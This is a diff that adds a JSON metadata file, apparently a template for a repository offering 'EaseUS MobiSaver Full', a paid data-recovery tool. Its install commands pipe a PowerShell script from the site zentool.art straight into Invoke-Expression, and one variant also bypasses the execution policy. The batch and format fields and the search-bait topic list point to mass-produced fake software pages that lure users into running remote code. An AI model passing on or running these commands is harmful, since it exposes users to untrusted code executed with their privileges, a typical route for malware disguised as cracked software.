@@ -1,0 +1,28 @@
+{
+  "repo": "EaseUS-MobiSaver-Full",
+  "product": "EaseUS MobiSaver Full",
+  "product_title": "EaseUS MobiSaver",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "backup",
+  "topics": [
+    "easeus-mobisaver-windows",
+    "easeus-config",
+    "easeus-integration",
+    "easeus-latest",
+    "data-recovery",
+    "file-recovery",
+    "disk-recovery",
+    "partition-manager",
+    "storage-tools",
+    "file-restore",
+    "ntfs",
+    "backup-software"
+  ],
+  "site": "zentool.art"
+}
